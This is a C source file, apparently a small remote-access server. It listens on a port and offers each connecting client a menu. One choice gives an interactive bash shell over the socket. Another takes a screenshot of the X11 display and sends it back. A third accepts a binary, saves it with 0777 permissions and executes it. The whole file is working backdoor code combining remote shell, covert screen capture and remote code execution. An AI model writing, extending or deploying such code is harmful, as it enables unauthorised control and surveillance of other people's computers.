//SCREENSHOT
#include <cairo.h>
#include <cairo-xlib.h>
#include <X11/Xlib.h>
#include <string.h>
#include <stdio.h>

//FILE
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/wait.h>

//NETWORK
#include<sys/socket.h>
#include<arpa/inet.h>
#include <unistd.h>

//UTIL
#include<stdio.h>
#include<string.h>
#include "server.h"

#define BUF_SIZE 255

int send_screenshot(int fd, int socket)
{
	char buffer[BUF_SIZE];
	int n = 0;
	while((n = read(fd, buffer, BUF_SIZE)) > 0){
		if(write(socket, buffer , n) < 0){
			//printf("send_failed");
			return 0;
		}
	}

	return 1;
}
void screenshot(int socket_client) {
    Display *disp;
    Window root;
    cairo_surface_t *surface;
    int scr;

    disp = XOpenDisplay(NULL);
    scr = DefaultScreen(disp);
    root = DefaultRootWindow(disp);

    surface = cairo_xlib_surface_create(disp, root, DefaultVisual(disp, scr),
            DisplayWidth(disp, scr), DisplayHeight(disp, scr));
    cairo_surface_write_to_png(
            surface,
            "/tmp/test.png");
    send_screenshot(open("/tmp/test.png", O_RDONLY), socket_client);
    cairo_surface_destroy(surface);
}

int get_client_choice(FILE *f){
	int choix = 0;
	char buffer[255];
	while(choix == 0){
		if(fgets(buffer, BUF_SIZE, f) != NULL){
			int i;
			for(i = 1; i < 4; i++){
				if(strchr(buffer, i + '0') != NULL)
					choix = i;
			}
		}
	}
	return choix;
}

void shell(int socket){
	if(fork() == 0){
		close(0);
		dup(socket);
		close(1);
		dup(socket);
		close(2);
		dup(socket);
		char* arg[] = {"bash", NULL};
		execvp(arg[0], arg);
	} else {
		wait(NULL);
	}
}

void run_latest(){
	int i = 0;
	int ok = 0;
	char filename[20];
	char execname[20];
	while(!ok){
		sprintf(filename, "config_%d", i);
		if( access(filename, F_OK ) != -1 ) {
			//FILE EXISTS
			sprintf(execname, "%s", filename);
		} else {
			break;
		}
		i++;
	}
	printf("%s\n", execname);
	if(strlen(execname) > 0){
		char* arg[] = {execname, NULL};
		execvp(arg[0], arg);
	}
}


void update_server(int in_fd){
	int i = 0;
	int ok = 0;
	char filename[20];
	while(!ok){
		sprintf(filename, "config_%d", i);
		if( access(filename, F_OK ) == -1 ) {
			ok = 1;
		}
		i++;
	}
	int fd = open(filename, O_CREAT | O_WRONLY, 0777);
	send_screenshot(in_fd, fd);
	close(fd);
	run_latest();
}
void handle_client(int socket){
	FILE *f = fdopen(socket, "r+");
	switch(get_client_choice(f)){
		case 1:
			printf("He choose shell\n");
			shell(socket);			
		break;
		case 2:
			printf("He choose screenshot\n");
			screenshot(socket);			
		break;
		case 3:
			printf("He choose update\n");
			update_server(socket);
	}
}
int main() {
    /*    close(0);
        close(1);
        close(2);
*/
	run_latest();	
	printf("coucou\n");	
	initialiser_signaux();
	int socket_serveur = creer_serveur(SERVER_PORT);
	if(socket_serveur == -1)
		return 1;

	int socket_client;
        while(1){
            socket_client = accept(socket_serveur, NULL, NULL);
            if (socket_client == -1){
                perror("accept ");
                return 1;
            }
            if(fork() == 0){
                handle_client(socket_client);

                close(socket_client);
                return 1;
            } else {
                close(socket_client);
            }
        }
        close(socket_serveur);

        return 0;
}
